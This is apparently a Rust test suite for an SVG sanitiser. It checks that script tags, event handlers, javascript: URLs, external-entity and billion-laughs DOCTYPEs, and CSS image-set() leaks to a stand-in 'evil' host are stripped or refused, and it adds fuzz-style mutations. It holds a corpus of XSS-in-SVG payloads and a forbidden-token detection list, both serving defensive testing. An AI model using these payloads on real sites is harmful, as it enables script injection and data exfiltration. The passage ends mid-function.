//! SVG sanitiser: hostile inputs are refused or neutralised, clean input keeps its geometry, and
//! the output is canonical (sanitising it again changes nothing).

#![allow(clippy::unwrap_used, clippy::expect_used)]

use ferrite_media::svg::{MAX_SVG_BYTES, SVG_MIME, SvgError, looks_like_svg, sanitize_svg};
use quick_xml::XmlVersion;
use quick_xml::events::Event;
use quick_xml::reader::Reader;

const SVG_OPEN: &str = r#"<svg xmlns="http://www.w3.org/2000/svg">"#;

fn fixture(name: &str) -> Vec<u8> {
    let path = format!("{}/tests/svg/{name}", env!("CARGO_MANIFEST_DIR"));
    std::fs::read(&path).unwrap_or_else(|e| panic!("read {path}: {e}"))
}

fn clean(input: &[u8]) -> String {
    let out = sanitize_svg(input).unwrap_or_else(|e| panic!("sanitize failed: {e:?}"));
    String::from_utf8(out).expect("output is UTF-8")
}

fn clean_str(input: &str) -> String {
    clean(input.as_bytes())
}

/// The output parses as XML with one root element and balanced tags.
fn assert_well_formed(out: &str) {
    let mut reader = Reader::from_str(out);
    let mut depth = 0usize;
    let mut roots = 0usize;
    loop {
        match reader.read_event() {
            Ok(Event::Start(_)) => {
                if depth == 0 {
                    roots += 1;
                }
                depth += 1;
            }
            Ok(Event::Empty(_)) if depth == 0 => roots += 1,
            Ok(Event::End(_)) => depth -= 1,
            Ok(Event::DocType(_)) => panic!("output has a DOCTYPE: {out}"),
            Ok(Event::Eof) => break,
            Ok(_) => {}
            Err(e) => panic!("output is not well-formed ({e}): {out}"),
        }
    }
    assert_eq!(depth, 0, "unbalanced output: {out}");
    assert_eq!(roots, 1, "output must have exactly one root: {out}");
}

/// Sanitising the output again yields the same bytes.
fn assert_idempotent(out: &str) {
    let again = clean_str(out);
    assert_eq!(again, out, "sanitise(sanitise(x)) != sanitise(x)");
}

/// True when an element in `out` has an attribute whose local name starts with `on` (any case).
fn has_event_attribute(out: &str) -> bool {
    let mut reader = Reader::from_str(out);
    loop {
        match reader.read_event() {
            Ok(Event::Start(e) | Event::Empty(e)) => {
                for attr in e.attributes() {
                    let attr = attr.expect("well-formed attribute");
                    let key = attr.key.local_name();
                    if key.as_ref().to_ascii_lowercase().starts_with(b"on") {
                        return true;
                    }
                }
            }
            Ok(Event::Eof) | Err(_) => return false,
            Ok(_) => {}
        }
    }
}

/// True when an attribute value could make the renderer load something: a CSS image function or
/// a `url(` that does not point into the document.
fn has_external_reference(out: &str) -> bool {
    let mut reader = Reader::from_str(out);
    loop {
        match reader.read_event() {
            Ok(Event::Start(e) | Event::Empty(e)) => {
                for attr in e.attributes() {
                    let attr = attr.expect("well-formed attribute");
                    let value = attr
                        .normalized_value(XmlVersion::Implicit1_0)
                        .expect("escaped value")
                        .to_lowercase();
                    let squashed: String = value.chars().filter(|c| !c.is_whitespace()).collect();
                    if ["image-set(", "image(", "cross-fade(", "element("]
                        .iter()
                        .any(|t| squashed.contains(t))
                    {
                        return true;
                    }
                    let mut rest = squashed.as_str();
                    while let Some(at) = rest.find("url(") {
                        rest = &rest[at + 4..];
                        if !rest.trim_start_matches(['"', '\'']).starts_with('#') {
                            return true;
                        }
                    }
                }
            }
            Ok(Event::Eof) | Err(_) => return false,
            Ok(_) => {}
        }
    }
}

/// True when `javascript:` appears where a renderer could act on it: in an attribute value or in
/// a `<style>` element. Text content (a `<title>`, a `<text>`) is inert and may contain it.
fn has_javascript_url(out: &str) -> bool {
    let mut reader = Reader::from_str(out);
    let mut in_style = 0usize;
    loop {
        match reader.read_event() {
            Ok(event @ (Event::Start(_) | Event::Empty(_))) => {
                let (Event::Start(e) | Event::Empty(e)) = &event else {
                    unreachable!()
                };
                if matches!(event, Event::Start(_))
                    && e.local_name().as_ref().eq_ignore_ascii_case(b"style")
                {
                    in_style += 1;
                }
                for attr in e.attributes() {
                    let attr = attr.expect("well-formed attribute");
                    let value = attr
                        .normalized_value(XmlVersion::Implicit1_0)
                        .expect("escaped value")
                        .to_lowercase();
                    let squashed: String = value.chars().filter(|c| !c.is_whitespace()).collect();
                    if squashed.contains("javascript:") {
                        return true;
                    }
                }
            }
            Ok(Event::End(e)) if e.local_name().as_ref().eq_ignore_ascii_case(b"style") => {
                in_style = in_style.saturating_sub(1);
            }
            Ok(Event::Text(t)) if in_style > 0 => {
                if String::from_utf8_lossy(&t)
                    .to_lowercase()
                    .contains("javascript:")
                {
                    return true;
                }
            }
            Ok(Event::CData(t)) if in_style > 0 => {
                if String::from_utf8_lossy(&t)
                    .to_lowercase()
                    .contains("javascript:")
                {
                    return true;
                }
            }
            Ok(Event::Eof) | Err(_) => return false,
            Ok(_) => {}
        }
    }
}

const FORBIDDEN: &[&str] = &[
    "script",
    "foreignobject",
    "onload",
    "javascript",
    "https://evil",
    "//evil",
    "animate",
    "<set",
    "<style",
    "<a ",
    "data:image/svg",
    "data:text",
    "<iframe",
    "<embed",
    "<object",
    "<handler",
    "<listener",
    "<feimage",
    "@import",
    "expression(",
    "<!entity",
    "<!doctype",
    "<?xml-stylesheet",
    "<?php",
    "cdata",
    "image-set(",
    "image(",
    "cross-fade(",
    "element(",
];

fn assert_neutral(name: &str, out: &str) {
    let lower = out.to_ascii_lowercase();
    for bad in FORBIDDEN {
        assert!(
            !lower.contains(bad),
            "{name}: output contains {bad:?}: {out}"
        );
    }
    assert!(
        !has_event_attribute(out),
        "{name}: event attribute kept: {out}"
    );
    assert_well_formed(out);
    assert_idempotent(out);
}

#[test]
fn clean_svg_survives() {
    let out = clean(&fixture("clean-icon.svg"));
    assert!(
        out.starts_with(r#"<?xml version="1.0" encoding="UTF-8"?>"#),
        "{out}"
    );
    for kept in [
        r#"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="24" height="24" viewBox="0 0 24 24" version="1.1">"#,
        "<title>Icon &amp; label</title>",
        r#"<linearGradient id="g1" x1="0" y1="0" x2="1" y2="1" gradientUnits="objectBoundingBox">"#,
        r##"<stop offset="0" stop-color="#ff0000" stop-opacity="1"/>"##,
        r##"<stop offset="1" stop-color="#0000ff"/>"##,
        r#"<path id="shape" d="M2 2h20v20H2z"/>"#,
        r##"<path d="M12 2L2 22h20L12 2z" fill="url(#g1)" stroke="#000" stroke-width="1.5" style="fill-opacity:0.8;stroke-linecap:round"/>"##,
        r##"<use xlink:href="#shape" transform="translate(1 1)" fill="none"/>"##,
        r#"<text x="2" y="20" font-family="&apos;Open Sans&apos;, sans-serif" xml:space="preserve">Hi <tspan font-weight="bold">there</tspan></text>"#,
        "</defs>",
        "</svg>",
    ] {
        assert!(out.contains(kept), "missing {kept:?} in {out}");
    }
    assert!(!out.contains("Generator"), "comments are dropped: {out}");
    assert_well_formed(&out);
    assert_idempotent(&out);
}

#[test]
fn hostile_svgs_are_neutralised() {
    for name in [
        "script.svg",
        "cdata-script.svg",
        "foreign-object.svg",
        "onload.svg",
        "onload-namespaced.svg",
        "xlink-javascript.svg",
        "entity-encoded-javascript.svg",
        "external-use.svg",
        "animate-href.svg",
        "set-href.svg",
        "style-element.svg",
        "style-attr-url.svg",
        "style-attr-import.svg",
        "image-data-svg.svg",
        "a-link.svg",
        "embedded-elements.svg",
        "xhtml-script.svg",
        "processing-instruction.svg",
        "image-functions-attr.svg",
        "image-functions-style.svg",
    ] {
        let out = clean(&fixture(name));
        assert_neutral(name, &out);
    }
}

#[test]
fn safe_parts_of_hostile_svgs_remain() {
    // Root and child event handlers go, the elements stay.
    let out = clean(&fixture("onload.svg"));
    assert!(out.contains(r#"<rect width="5" height="5"/>"#), "{out}");
    assert!(out.contains(r#"<circle r="1"/>"#), "{out}");
    // A style with a forbidden token is dropped whole; otherwise only allowlisted
    // declarations stay.
    for name in ["style-attr-url.svg", "style-attr-import.svg"] {
        let out = clean(&fixture(name));
        assert!(
            !out.contains("style="),
            "{name}: every style here is refused: {out}"
        );
        assert!(!out.contains("url("), "{name}: {out}");
    }
    let out = clean_str(&format!(
        r#"{SVG_OPEN}<rect style=" FILL : red ; position: fixed; behavior: thing; mask: url(#m) ;; stroke:"/></svg>"#
    ));
    assert!(
        out.contains(r#"<rect style="fill:red;mask:url(#m)"/>"#),
        "{out}"
    );
    assert_idempotent(&out);
    // Reference properties keep only `none` or one local `url(#id)`; the element stays.
    for name in ["image-functions-attr.svg", "image-functions-style.svg"] {
        let out = clean(&fixture(name));
        assert_eq!(
            out.matches(r#"<rect width="1" height="1"/>"#).count(),
            12,
            "{name}: {out}"
        );
        assert!(out.contains(r#"<path d="M0 0L1 1"/>"#), "{name}: {out}");
    }
    // A style holding a refused token is dropped whole, even next to a safe declaration.
    let out = clean(&fixture("image-functions-style.svg"));
    assert!(!out.contains("style="), "{out}");
    let out = clean_str(&format!(
        r##"{SVG_OPEN}<rect mask="none" clip-path=" url( '#c' ) " filter="url(#f) url(#g)" marker-end="url(#m)" fill="url(#p) red" stroke="none"/></svg>"##
    ));
    assert!(
        out.contains(r##"<rect mask="none" clip-path=" url( &apos;#c&apos; ) " marker-end="url(#m)" fill="url(#p) red" stroke="none"/>"##),
        "{out}"
    );
    assert_idempotent(&out);
    // A raster data URI in <image> is kept, canonicalised; elsewhere it is not.
    let input = format!(
        r#"{SVG_OPEN}<image width="1" height="1" href=" DATA:image/PNG;base64,iVBO Rw0K Ggo= "/><use href="data:image/png;base64,iVBORw0KGgo="/></svg>"#
    );
    let out = clean_str(&input);
    assert!(
        out.contains(r#"<image width="1" height="1" href="data:image/png;base64,iVBORw0KGgo="/>"#),
        "{out}"
    );
    assert!(out.contains("<use/>"), "{out}");
    assert_idempotent(&out);
    // Local references survive with either spelling.
    let out = clean_str(
        r##"<svg xmlns="http://www.w3.org/2000/svg" xmlns:q="http://www.w3.org/1999/xlink"><use q:href="#a"/><use href=" #b "/><rect fill="url( '#g' )" clip-path="url(#c)"/></svg>"##,
    );
    assert!(out.contains(r##"<use xlink:href="#a"/>"##), "{out}");
    assert!(out.contains(r##"<use href="#b"/>"##), "{out}");
    assert!(out.contains(r##"fill="url( &apos;#g&apos; )""##), "{out}");
    assert!(out.contains(r##"clip-path="url(#c)""##), "{out}");
    assert!(
        out.contains(r#"xmlns:xlink="http://www.w3.org/1999/xlink""#),
        "{out}"
    );
    assert_idempotent(&out);
}

#[test]
fn doctype_and_entities_are_refused() {
    for name in [
        "billion-laughs.svg",
        "xxe-system.svg",
        "parameter-entity.svg",
    ] {
        assert!(
            matches!(sanitize_svg(&fixture(name)), Err(SvgError::Doctype)),
            "{name}"
        );
    }
    // Illustrator's standard SVG 1.1 DOCTYPE is accepted and not written out (nothing is fetched).
    let out = clean(&fixture("illustrator-doctype.svg"));
    assert!(!out.to_ascii_lowercase().contains("doctype"), "{out}");
    assert!(out.contains(r#"<path d="M2 2h20v20H2z"/>"#), "{out}");
    assert_well_formed(&out);
    assert_idempotent(&out);
    const ILLUSTRATOR: &str = r#"<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">"#;
    for input in [
        // A standard public id with an internal subset.
        format!(
            r#"<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [<!ENTITY a "b">]>{SVG_OPEN}</svg>"#
        ),
        // Twice, or inside / after the root.
        format!("{ILLUSTRATOR}{ILLUSTRATOR}{SVG_OPEN}</svg>"),
        format!("{SVG_OPEN}{ILLUSTRATOR}</svg>"),
        // SYSTEM only, another public id, another root name.
        format!(
            r#"<!DOCTYPE svg SYSTEM "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">{SVG_OPEN}</svg>"#
        ),
        format!(
            r#"<!DOCTYPE svg PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "x.dtd">{SVG_OPEN}</svg>"#
        ),
        format!(r#"<!DOCTYPE html PUBLIC "-//W3C//DTD SVG 1.1//EN" "x.dtd">{SVG_OPEN}</svg>"#),
    ] {
        assert!(
            matches!(sanitize_svg(input.as_bytes()), Err(SvgError::Doctype)),
            "{input}: {:?}",
            sanitize_svg(input.as_bytes())
        );
    }
    // An accepted DOCTYPE declares no entities: `&nbsp;` is still unknown.
    assert!(matches!(
        sanitize_svg(format!("{ILLUSTRATOR}{SVG_OPEN}<title>&nbsp;</title></svg>").as_bytes()),
        Err(SvgError::UnknownEntity(_))
    ));
    // A DOCTYPE without an internal subset, or after the root, is refused too.
    let late = format!("{SVG_OPEN}</svg><!DOCTYPE svg>");
    assert!(matches!(
        sanitize_svg(late.as_bytes()),
        Err(SvgError::Doctype | SvgError::NotXml(_))
    ));
    assert!(matches!(
        sanitize_svg(b"<!DOCTYPE svg><svg xmlns=\"http://www.w3.org/2000/svg\"/>"),
        Err(SvgError::Doctype)
    ));
    match sanitize_svg(&fixture("unknown-entity.svg")) {
        Err(SvgError::UnknownEntity(name)) => assert_eq!(name, "custom"),
        other => panic!("expected UnknownEntity, got {other:?}"),
    }
    // In an attribute value, and inside a dropped subtree, an unknown entity is still refused.
    for input in [
        format!(r#"{SVG_OPEN}<rect fill="&custom;"/></svg>"#),
        format!(r#"{SVG_OPEN}<script>&custom;</script></svg>"#),
    ] {
        assert!(
            matches!(
                sanitize_svg(input.as_bytes()),
                Err(SvgError::UnknownEntity(_))
            ),
            "{input}"
        );
    }
    // Predefined and numeric references are fine and come out escaped.
    let out = clean_str(&format!(
        r#"{SVG_OPEN}<title>&lt;b&gt; &amp; &apos;&quot; &#65;&#x42;</title></svg>"#
    ));
    assert!(
        out.contains("<title>&lt;b&gt; &amp; &apos;&quot; AB</title>"),
        "{out}"
    );
    assert_idempotent(&out);
    // A reference to a character XML forbids is refused rather than written out.
    assert!(matches!(
        sanitize_svg(format!("{SVG_OPEN}<title>&#1;</title></svg>").as_bytes()),
        Err(SvgError::NotXml(_))
    ));
}

#[test]
fn namespace_tricks_do_not_pass() {
    let out = clean_str(&format!(
        r#"{SVG_OPEN}<x:script xmlns:x="http://www.w3.org/2000/svg">alert(1)</x:script><rect width="1"/></svg>"#
    ));
    assert!(!out.contains("script") && !out.contains("alert"), "{out}");
    assert!(out.contains(r#"<rect width="1"/>"#), "{out}");

    assert!(matches!(
        sanitize_svg(br#"<svg xmlns="http://www.w3.org/1999/xhtml"><rect/></svg>"#),
        Err(SvgError::NotSvg)
    ));
    assert!(matches!(
        sanitize_svg(br#"<svg><rect/></svg>"#),
        Err(SvgError::NotSvg)
    ));
    assert!(matches!(
        sanitize_svg(br#"<SVG xmlns="http://www.w3.org/2000/svg"/>"#),
        Err(SvgError::NotSvg)
    ));

    let out = clean_str(
        r#"<svg xmlns="http://www.w3.org/2000/svg" xmlns:q="http://www.w3.org/1999/xlink"><use q:href="javascript:x"/></svg>"#,
    );
    assert!(
        !out.contains("javascript") && !out.contains("href"),
        "{out}"
    );
    assert!(
        !out.contains("xmlns:q"),
        "input declarations are never copied: {out}"
    );

    let out = clean_str(&format!(
        "{SVG_OPEN}<SCRIPT>alert(1)</SCRIPT><Script/><rect/></svg>"
    ));
    assert!(!out.to_ascii_lowercase().contains("script"), "{out}");
    assert!(!out.contains("alert"), "{out}");

    // A prefixed SVG document comes out canonical: unprefixed names, fixed declarations.
    let out = clean_str(
        r##"<s:svg xmlns:s="http://www.w3.org/2000/svg" xmlns:l="http://www.w3.org/1999/xlink" xmlns:evil="urn:x"><s:g><s:rect s:width="1" width="2"/><s:use l:href="#r"/></s:g><evil:x/></s:svg>"##,
    );
    assert!(
        out.contains(
            r##"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g><rect width="2"/><use xlink:href="#r"/></g></svg>"##
        ),
        "{out}"
    );
    assert_idempotent(&out);

    // `href` and `xlink:href` spelled twice through different prefixes keep the first only.
    let out = clean_str(
        r##"<svg xmlns="http://www.w3.org/2000/svg" xmlns:a="http://www.w3.org/1999/xlink" xmlns:b="http://www.w3.org/1999/xlink"><use a:href="#one" b:href="#two"/></svg>"##,
    );
    assert!(out.contains(r##"<use xlink:href="#one"/>"##), "{out}");
    assert_well_formed(&out);

    // An XHTML <script> smuggled in by a default-namespace switch is dropped with its subtree.
    let out = clean(&fixture("xhtml-script.svg"));
    assert!(
        !out.contains("circle"),
        "wrong-namespace subtree dropped: {out}"
    );
    assert!(out.contains(r#"<rect width="1" height="1"/>"#), "{out}");
}

#[test]
fn encoding_tricks_are_refused() {
    for name in ["utf16le-bom.svg", "utf16be-nobom.svg", "latin1-decl.svg"] {
        assert!(
            matches!(sanitize_svg(&fixture(name)), Err(SvgError::NotUtf8)),
            "{name}"
        );
    }
    // Valid UTF-8 bytes that declare another encoding are refused, not reinterpreted.
    assert!(matches!(
        sanitize_svg(
            br#"<?xml version="1.0" encoding="windows-1252"?><svg xmlns="http://www.w3.org/2000/svg"/>"#
        ),
        Err(SvgError::NotUtf8)
    ));
    // A UTF-8 BOM is accepted and not copied; a declared UTF-8 (any case) is fine.
    let out = clean(&fixture("utf8-bom.svg"));
    assert!(out.starts_with("<?xml"), "{out}");
    assert!(out.contains("<title>café</title>"), "{out}");
    clean_str(r#"<?xml version="1.0" encoding="utf-8"?><svg xmlns="http://www.w3.org/2000/svg"/>"#);
}

#[test]
fn malformed_documents_are_not_xml() {
    for input in [
        format!("{SVG_OPEN}<g>"),
        format!("{SVG_OPEN}<g></svg>"),
        format!("{SVG_OPEN}</g></svg>"),
        format!("{SVG_OPEN}</svg><svg xmlns=\"http://www.w3.org/2000/svg\"/>"),
        format!("{SVG_OPEN}</svg>trailing"),
        format!("leading{SVG_OPEN}</svg>"),
        format!(r#"{SVG_OPEN}<rect width="1" width="2"/></svg>"#),
        format!(r#"{SVG_OPEN}<rect width=1/></svg>"#),
        format!("{SVG_OPEN}<title>a & b</title></svg>"),
    ] {
        assert!(
            matches!(sanitize_svg(input.as_bytes()), Err(SvgError::NotXml(_))),
            "{input}: {:?}",
            sanitize_svg(input.as_bytes())
        );
    }
    assert!(matches!(sanitize_svg(b""), Err(SvgError::NotSvg)));

    // `NotXml` never echoes input: a fixed description plus a byte offset, at most 200 chars.
    let long = "q".repeat(500);
    for input in [
        format!("{SVG_OPEN}<g{long}></g></svg>"),
        format!("{SVG_OPEN}<{long}></{long}x></svg>"),
        format!("{SVG_OPEN}<rect {long}=1/></svg>"),
        format!("{SVG_OPEN}<title>&#x{long};</title></svg>"),
        format!("{SVG_OPEN}</svg>{long}"),
        format!(r#"<?xml version="{long}"?>{SVG_OPEN}</svg>"#),
    ] {
        match sanitize_svg(input.as_bytes()) {
            Err(SvgError::NotXml(msg)) => {
                assert!(msg.len() <= 200 && !msg.contains("qq"), "{msg}");
                assert!(msg.contains(" at byte "), "{msg}");
            }
            other => panic!("expected NotXml, got {other:?}"),
        }
    }
    // An unknown entity's name is capped too.
    match sanitize_svg(format!("{SVG_OPEN}<title>&{long};</title></svg>").as_bytes()) {
        Err(SvgError::UnknownEntity(name)) => assert_eq!(name.len(), 64),
        other => panic!("expected UnknownEntity, got {other:?}"),
    }
}

#[test]
fn bombs_are_bounded() {
    let nested = |depth: usize| {
        let mut s = String::from(SVG_OPEN);
        s.push_str(&"<g>".repeat(depth - 1));
        s.push_str(&"</g>".repeat(depth - 1));
        s.push_str("</svg>");
        s
    };
    clean_str(&nested(64));
    assert!(matches!(
        sanitize_svg(nested(65).as_bytes()),
        Err(SvgError::TooDeep)
    ));
    // Depth counts dropped elements too.
    let mut deep_dropped = String::from(SVG_OPEN);
    deep_dropped.push_str(&"<x>".repeat(64));
    deep_dropped.push_str(&"</x>".repeat(64));
    deep_dropped.push_str("</svg>");
    assert!(matches!(
        sanitize_svg(deep_dropped.as_bytes()),
        Err(SvgError::TooDeep)
    ));

    let many = |count: usize| format!("{SVG_OPEN}{}</svg>", "<x/>".repeat(count - 1));
    clean_str(&many(50_000));
    assert!(matches!(
        sanitize_svg(many(50_001).as_bytes()),
        Err(SvgError::TooManyElements)
    ));

    let mut big = format!("{SVG_OPEN}<title>").into_bytes();
    big.resize(MAX_SVG_BYTES + 1, b'a');
    assert!(matches!(sanitize_svg(&big), Err(SvgError::TooLarge)));

    let attrs = |count: usize| {
        let list: String = (0..count).map(|i| format!(" data-a{i}=\"1\"")).collect();
        format!("{SVG_OPEN}<rect{list}/></svg>")
    };
    clean_str(&attrs(64));
    assert!(matches!(
        sanitize_svg(attrs(65).as_bytes()),
        Err(SvgError::TooManyAttributes)
    ));

    let value = |len: usize| format!(r#"{SVG_OPEN}<path d="{}"/></svg>"#, "M".repeat(len));
    clean_str(&value(256 * 1024));
    assert!(matches!(
        sanitize_svg(value(256 * 1024 + 1).as_bytes()),
        Err(SvgError::ValueTooLong)
    ));
}

#[test]
fn use_fan_out_is_bounded() {
    // The review's bomb: 9 levels of 10 uses of the level below (~10^9 instances).
    assert!(matches!(
        sanitize_svg(&fixture("use-fanout.svg")),
        Err(SvgError::TooManyUses)
    ));
    let uses = |count: usize| {
        format!(
            r##"{SVG_OPEN}<defs><rect id="r" width="1" height="1"/></defs>{}</svg>"##,
            r##"<use href="#r"/>"##.repeat(count)
        )
    };
    clean_str(&uses(128));
    assert!(matches!(
        sanitize_svg(uses(129).as_bytes()),
        Err(SvgError::TooManyUses)
    ));
    // Uses inside a dropped subtree are not kept and not counted.
    clean_str(&format!(
        r##"{SVG_OPEN}<rect id="r"/><x>{}</x></svg>"##,
        r##"<use href="#r"/>"##.repeat(200)
    ));
    for input in [
        // A use of a use.
        format!(r##"{SVG_OPEN}<rect id="r"/><use id="u" href="#r"/><use href="#u"/></svg>"##),
        // A use of a symbol (or group) containing a use, xlink spelling included.
        r##"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><rect id="r"/><symbol id="s"><use href="#r"/></symbol><use xlink:href="#s"/></svg>"##.to_owned(),
        // A use of its own ancestor.
        format!(r##"{SVG_OPEN}<g id="g"><use href="#g"/></g></svg>"##),
        // Duplicate ids: any element carrying the id counts.
        format!(
            r##"{SVG_OPEN}<rect id="d"/><g id="d"><use href="#x"/></g><use href="#d"/></svg>"##
        ),
    ] {
        assert!(
            matches!(sanitize_svg(input.as_bytes()), Err(SvgError::TooManyUses)),
            "{input}"
        );
    }
    // A use of a use-free subtree, or of an unknown id, is fine.
    let out = clean_str(&format!(
        r##"{SVG_OPEN}<g id="g"><rect/><circle r="1"/></g><use href="#g"/><use href="#missing"/></svg>"##
    ));
    assert!(out.contains(r##"<use href="#g"/>"##), "{out}");
}

#[test]
fn html_named_svg_is_not_svg() {
    assert!(matches!(
        sanitize_svg(&fixture("html.svg")),
        Err(SvgError::NotXml(_) | SvgError::NotSvg)
    ));
    assert!(matches!(
        sanitize_svg(b"<!doctype html><html><body><svg onload=alert(1)>"),
        Err(SvgError::NotXml(_) | SvgError::NotSvg | SvgError::Doctype)
    ));
}

#[test]
fn looks_like_svg_heads() {
    assert_eq!(SVG_MIME, "image/svg+xml");
    assert!(looks_like_svg(
        b"<svg xmlns=\"http://www.w3.org/2000/svg\"/>"
    ));
    assert!(looks_like_svg(
        b"\xEF\xBB\xBF \n\t<?xml version=\"1.0\"?><svg/>"
    ));
    assert!(looks_like_svg(b"<!-- made by hand --><svg/>"));
    assert!(!looks_like_svg(b"<html><svg/></html>"));
    assert!(!looks_like_svg(b"<?xml version=\"1.0\"?><feed/>"));
    assert!(!looks_like_svg(b"\x89PNG\r\n\x1a\n<svg"));
    assert!(!looks_like_svg(b""));
    let mut late = b"<?xml version=\"1.0\"?>".to_vec();
    late.resize(8 * 1024, b' ');
    late.extend_from_slice(b"<svg/>");
    assert!(!looks_like_svg(&late), "<svg must appear within 8 KiB");
}

/// Known XSS-in-SVG payloads plus every fixture and deterministic mutations of them: nothing
/// panics, and whatever is accepted is well-formed, idempotent and free of active content.
#[test]
fn payload_corpus_never_yields_active_content() {
    let payloads = [
        r#"<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><a><rect width="100%" height="100%"/><animate attributeName="href" values="javascript:alert(1)"/></a></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><set attributeName="onmouseover" to="alert(1)"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"/></foreignObject></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+#x"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><image href="x" onerror="alert(1)"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><style>svg{background:url("javascript:alert(1)")}</style></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:url(&quot;javascript:alert(1)&quot;)"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(java&#x09;script:alert(1))"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><use href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)"/></svg>"#,
        r##"<svg xmlns="http://www.w3.org/2000/svg"><use href="#x&#10;javascript:alert(1)"/></svg>"##,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><script xlink:href="https://evil/x.js" xmlns:xlink="http://www.w3.org/1999/xlink"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><title><![CDATA[</title><script>alert(1)</script>]]></title></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><title>&lt;script&gt;alert(1)&lt;/script&gt;</title></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><text>&lt;/text&gt;&lt;script&gt;</text></svg>"#,
        r#"<?xml version="1.0"?><!DOCTYPE a [<!ENTITY a "<script>alert(1)</script>">]><svg xmlns="http://www.w3.org/2000/svg">&a;</svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><!--><script>alert(1)</script>--></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><g on load="x"/><g onload ="alert(1)"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:red;/**/background:url(https://evil/)"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:&quot;}&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;"/></svg>"#,
        // Review I1: payloads that made Chromium fetch, and their relatives.
        r#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="mask:image-set('https://evil/leak-style-imageset.png' 1x)"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><rect mask="image-set('https://evil/leak-attr-imageset.png' 1x)"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="mask:-webkit-image-set('https://evil/leak-webkit-imageset.png' 1x)"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="mask:image('https://evil/x.png')"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="mask:cross-fade('https://evil/a.png','https://evil/b.png',50%)"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><rect mask="-webkit-cross-fade('https://evil/a.png','https://evil/b.png',50%)"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><rect fill="image-set('https://evil/f.png' 1x)" stroke="element(#x)"/></svg>"#,
        r#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="filter:image('https://evil/e.png');clip-path:image-set('https://evil/d.png' 1x)"/></svg>"#,
    ];
    let mut corpus: Vec<Vec<u8>> = payloads.iter().map(|p| p.as_bytes().to_vec()).collect();
    let dir = format!("{}/tests/svg", env!("CARGO_MANIFEST_DIR"));
    // Sorted: `read_dir` order differs between file systems, and the mutations below pair
    // each seed with the next values of one generator.
    let mut paths: Vec<_> = std::fs::read_dir(&dir)
        .expect("fixture dir")
        .map(|entry| entry.expect("entry").path())
        .collect();
    paths.sort();
    for path in paths {
        corpus.push(std::fs::read(path).expect("fixture"));
    }

    // Deterministic mutations: truncations, byte flips and splices of markup fragments.
    let fragments: [&[u8]; 10] = [
        b"<script>",
        b" onload=\"x\"",
        b"javascript:",
        b"<!ENTITY a \"b\">",
        b"&#x6a;",
        b"</",
        b"<![CDATA[",
        b"\"",
        b">",
        b"<svg xmlns=\"http://www.w3.org/2000/svg\">",
    ];
    let mut state: u64 = 0x9E37_79B9_7F4A_7C15;
    let mut next = move || {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        state
    };
    let base = corpus.clone();
    for seed in &base {
        for _ in 0..40 {
            let mut m = seed.clone();
            let len = m.len().max(1) as u64;
            match next() % 3 {
                0 => m.truncate((next() % len) as usize),
                1 => {
                    let at = (next() % len) as usize;
                    if at < m.len() {
                        m[at] = (next() & 0xFF) as u8;
                    }
                }
                _ => {
                    let at = ((next() % len) as usize).min(m.len());
                    let frag = fragments[(next() % fragments.len() as u64) as usize];
                    m.splice(at..at, frag.iter().copied());
                }
            }
            corpus.push(m);
        }
    }

